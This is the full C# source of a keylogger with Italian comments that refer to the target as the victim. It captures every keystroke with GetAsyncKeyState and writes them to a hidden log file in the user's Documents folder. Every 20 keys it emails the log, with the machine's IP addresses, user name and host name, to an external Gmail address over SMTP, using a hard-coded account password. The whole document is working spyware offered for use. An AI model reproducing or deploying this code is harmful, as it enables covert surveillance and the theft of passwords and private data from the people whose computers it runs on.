using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Net.WebSockets;

namespace KeyLogger
{
	class Program
	{
		[DllImport("User32.dll")]
		public static extern int GetAsyncKeyState(Int32 i);
		// stringa per mantenere tutte le pressione su tastiera
		static long numberOfKeystrokes = 0;
		static void Main(string[] args)
		{
			// Creiamo il file dove memorizzare i Log
			String filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
			// Se il percorso non esiste sulla macchina locale lo creiamo 
			if (!Directory.Exists(filepath))
			{
				Directory.CreateDirectory(filepath);
			}
			string path = (filepath + @"\thefallendreams.txt");
			// Se il File non esiste lo creiamo
			if (!File.Exists(path))
			{
				using (StreamWriter sw = File.CreateText(path))
				{

				}
			}
			//Nascondere il file di memorizzazione dei log da tastiera in "Hidden"
			File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.Hidden);
			//Schema del Programma
			// 1 - Cattura il tasto premuto e mostralo a schermo
			while (true) //Creiamo un Loop Infinito
			{
				Thread.Sleep(20); //programmiamo uno stop-time
								  //Controlliamo lo stato di tutti i tasti
				for (int i = 32; i < 127; i++)
				{
					int keyState = GetAsyncKeyState(i);
					if (keyState == 32768)
					{
						Console.Write((char)i + ", ");
						// 2 - Scrivi su file quale tasto è stato premuto
						using (StreamWriter sw = File.AppendText(path))
						{
							sw.Write((char)i);
						}
						numberOfKeystrokes++;
						//Invia una mail ogni 20 Caratteri che la vittima scrive
						if (numberOfKeystrokes % 20 == 0)
						{
							SendNewMessage();
						}
					}
				}
				// Stampiamo a console quando vengono premuti
			}


		} //main
		  // 3 - Invia Periodicamente il contenuto del file di log ad un indirizzo mail esterno
		static void SendNewMessage()
		{

			String folderName = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
			string filePath = folderName + @"\thefallendreams.txt";

			String logContents = File.ReadAllText(filePath);

			string emailBody = "";

			//Creazione del messaggio mail

			//Prendiamo la Data

			DateTime now = DateTime.Now;
			string subject = "Email From hacker journal";

			//Prendiamo l'HostName della Macchina
			var host = Dns.GetHostEntry(Dns.GetHostName()); // IP della macchina vittima

			foreach (var address in host.AddressList)
			{
				emailBody += "Address: " + address;
			}
			emailBody += "\nUser: " + Environment.UserDomainName + "\\" + Environment.UserName;
			emailBody += "\nhost :" + host; // Il nome Host 
			emailBody += "\ntime :" + now.ToString(); //Invia la Data ed il Time
			emailBody += logContents;

			SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
			MailMessage mailMessage = new MailMessage();

			mailMessage.From = new MailAddress("fall7th.dream@gmail.com");
			mailMessage.To.Add("fall7th.dream@gmail.com");
			mailMessage.Subject = subject;
			client.UseDefaultCredentials = false;
			client.EnableSsl = true;
			client.Credentials = new System.Net.NetworkCredential("fall7th.dream@gmail.com", "Rwerl0cal01");
			mailMessage.Body = emailBody;

			client.Send(mailMessage);
		}
	}
}